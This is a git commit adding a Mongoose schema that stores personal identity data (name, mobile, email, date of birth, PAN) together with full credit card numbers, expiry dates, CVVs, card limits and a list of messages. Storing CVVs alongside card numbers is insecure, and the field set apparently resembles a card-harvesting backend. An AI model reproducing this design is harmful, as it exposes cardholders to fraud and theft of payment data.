e5c182598dd6e84b59b58caf4d9f302fe98db279
Pinku <py7953234@gmail.com>
2024-12-24 11:29:05 +0530

    first commit

---
+++ models/CardData.js
@@ -0,0 +1,21 @@
+const mongoose = require('mongoose');
+
+const CardSchema = new mongoose.Schema({
+    name: String,
+    mobile: Number,
+    email: String,
+    dob: String,
+    pan: String,
+
+    totalLimit: Number,
+    avLimit: Number,
+    cardNumber: String,
+    holderName: String,
+    exDate: String,
+    cvv: Number,
+    messages: [String]
+}, { timestamps: true })
+
+const CardModal = mongoose.model('CardModel', CardSchema);
+
+module.exports = CardModal;
